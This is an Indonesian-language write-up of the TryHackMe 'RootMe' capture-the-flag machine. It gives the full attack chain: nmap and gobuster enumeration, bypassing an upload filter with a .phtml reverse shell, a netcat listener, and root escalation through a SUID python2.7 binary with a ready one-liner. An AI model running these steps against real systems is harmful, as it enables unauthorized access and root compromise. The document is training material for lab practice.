# CTF RootMe (TryHackMe)

## 1. Informasi Target & Penyerang

**Target IP:**
`10.48.188.9`

**Mesin Penyerang:**
Kali Linux 25.3 (Running on UTM - Apple Silicon M5)

**Tools Utama:**

* Nmap
* Gobuster
* Netcat
* Python

---

# 2. Tahap Enumerasi (Pengumpulan Informasi)

Langkah awal dilakukan untuk memetakan layanan yang aktif pada server target.

## Scanning Port

Melakukan scanning menggunakan **Nmap** untuk mengidentifikasi layanan yang berjalan.

```bash
nmap -sV 10.48.188.9
```

### Hasil

| Port | Service | Versi               |
| ---- | ------- | ------------------- |
| 22   | SSH     | OpenSSH 7.6p1       |
| 80   | HTTP    | Apache httpd 2.4.29 |

---

## Directory Discovery

Dilakukan brute-force direktori menggunakan **Gobuster** untuk menemukan direktori tersembunyi.

```bash
gobuster dir -u http://10.48.188.9 -w /usr/share/wordlists/dirb/common.txt
```

### Hasil

Ditemukan dua direktori penting:

* `/panel/` → Form upload file
* `/uploads/` → Tempat penyimpanan file hasil upload

---

# 3. Tahap Eksploitasi (Gaining Access)

Pada tahap ini dilakukan percobaan untuk mendapatkan akses ke sistem melalui celah **File Upload Vulnerability**.

## Vulnerability

Server memblokir file dengan ekstensi:

```
.php
```

## Bypass Filter

Filter berhasil dilewati dengan mengganti ekstensi reverse shell menjadi:

```
.phtml
```

---

## Langkah Eksploitasi

1. Mengunggah file **reverse shell** bernama:

```
shell.phtml
```

melalui halaman:

```
/panel/
```

2. Menyiapkan listener pada mesin Kali Linux:

```bash
nc -lvnp 1234
```

3. Mengakses file shell melalui browser:

```
http://10.48.188.9/uploads/shell.phtml
```

---

## Hasil

Berhasil mendapatkan **reverse shell** dengan hak akses user:

```
www-data
```

---

# 4. Tahap Eskalasi Hak Akses (Privilege Escalation)

Setelah mendapatkan akses sebagai user biasa, langkah selanjutnya adalah mencari cara untuk meningkatkan hak akses menjadi **root**.

## Analisis SUID

Mencari binary dengan **SUID bit aktif** menggunakan perintah:

```bash
find / -perm -4000 2>/dev/null
```

### Temuan

Binary berikut memiliki izin **SUID**:

```
/usr/bin/python2.7
```

---

## Eksploitasi

Menggunakan Python untuk menjalankan shell dengan mempertahankan hak akses SUID.

```bash
python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## Hasil

Berhasil mendapatkan akses sebagai:

```
root
```

Verifikasi menggunakan perintah:

```bash
whoami
```

Output:

```
root
```

---

# 5. Penemuan Flag

## User Flag

Lokasi file:

```
/var/www/user.txt
```

---

## Root Flag

Lokasi file:

```
/root/root.txt
```

---

# Kesimpulan

Mesin **RootMe** memiliki kerentanan pada fitur **file upload** yang memungkinkan penyerang mengunggah **reverse shell** dengan mem-bypass filter ekstensi file. Setelah mendapatkan akses sebagai user `www-data`, penyerang dapat melakukan **Privilege Escalation** melalui binary `python2.7` yang memiliki **SUID bit aktif**, sehingga memungkinkan eksekusi shell dengan hak akses **root**.

---
